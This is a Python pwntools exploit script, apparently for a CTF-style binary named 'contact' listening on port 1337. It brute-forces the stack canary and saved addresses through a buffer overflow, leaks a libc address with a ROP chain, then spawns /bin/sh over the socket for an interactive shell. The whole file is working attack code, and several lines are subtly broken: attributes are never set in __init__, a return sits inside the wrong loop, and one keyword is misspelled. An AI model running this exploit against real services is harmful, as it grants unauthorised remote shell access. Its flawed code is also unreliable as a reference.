#!/usr/bin/env python3

from pwn import *
from concurrent import futures
from base64 import b64encode, b64decode
from time import sleep

context(os="Linux", arch="amd64")
RHOST = "localhost"
RPORT = "1337"


class BruteForcer:
    def __init__(self):
        end_pool = False
        previous = ""
        result = ""

    def check_byte(self, payload):
        # Checking if byte causes program to return Done
        # Else... Stack Canary probably killed us
        if not self.end_pool:
            r = remote(RHOST, RPORT, level="error")
            r.recvline(timeout=1)  # Please enter the message....
            r.send(payload)
            try:
                resp = r.recvline(timeout=1).rstrip()
                if "Done." == resp.decode():
                    r.close()
                    return True
            except BaseException:
                pass
            try:
                r.close()
            except BaseException:
                pass
        return False

    def done(self, fn):
        # Byte was found, Append to result (content) and tell all jobs the work is done
        if fn.result():
            print(f"Byte Found: {fn.arg}")
            self.content += chr(fn.arg)
            self.end_pool = True

    def get_address(self, previous):
        # Bruteforce the address.
        self.result = ""
        self.content = ""

        # Run until we have the full address
        while len(self.content) != 8:
            junk = "A" * 56 + previous
            self.end_pool = False
            ex = futures.ThreadPoolExecutor(max_workers=4)
            for byte in range(0x00, 0x100):
                payload = junk + self.content + chr(byte)
                f = ex.submit(self.check_byte, payload)
                f.arg = byte
                f.add_done_callback(self.done)

            while True:
                if self.end_pool == True:
                    break
                if ex.work_queue.empty() and len(ex.threads) == 0:
                    log.error("Failed to get byte, looped through everything")
                    break
                return self.content


# Stage 1. Leak addresses
bf = BruteForcer()
canary = bf.get_address("")
log.success(f"Canary: {hex(u64(canary))}")

bf = BruteForcer()
rbp = bf.get_address(canary)
log.success(f"RBP: {hex(u64(rbp))}")

bf = BruteForcer()
rip = bf.get_address(canary + rbp)
log.success(f"RIP: {hex(u64(rip))}")

junk = "A" * 56
prefix = f"{junk}{canary}{rbp}"

# Stage 2. Rebase Our Binaries
# 0x1562 = rip - 0x555555554000 (pulled from vmmap, start address changes due to ASLR, but difference is constant)
base_address = u64(rip) - 0x1562
elf = ELF("./contact", checksec=False)
elf.address = base_address
rop = ROP(elf)

# Stage 3. Leak libc address
# 0x4 = fd of socket that will be opened for this request
# 0x8 = length
rop.write(0x4, elf.got["write"], 0x8)
log.info(f"ROP chain write():\n{rop.dump()}")
r = remote(RHOST, RPORT, Level="error")
r.recvline(timeout=1)
chain = rop.chain()
# chain = chain.decode('latin-1')
r.send(prefix + chain)
write_libc = u64(r.recv(8))
log.success(f"Leaked write@libc: {hex(write_libc)}")

# Stage 4. Loading Libc
elf_libc = ELF("libc.so.6.kali")
elf_libc.address = write_libc - elf_libc.symbols["write"]
rop_libc = ROP(elf_libc)
binsh = next(elf_libc.search("/bin/sh\x00".encode()))

# Stage 5. Get Code Execution
rop_libc.dup2(0x4, 0x0)
rop_libc.dup2(0x4, 0x1)
rop_libc.execve(binsh, 0x0, 0x0)
log.success(f"Rop Chain:\n{rop_libc.dump()}")
r = remote(RHOST, RPORT, level="error")
r.recvline(timeout=1)
chain = rop_libc.chain()
chain = chain.decode("latin-1")
r.send(prefix + chain)
r.interactive()
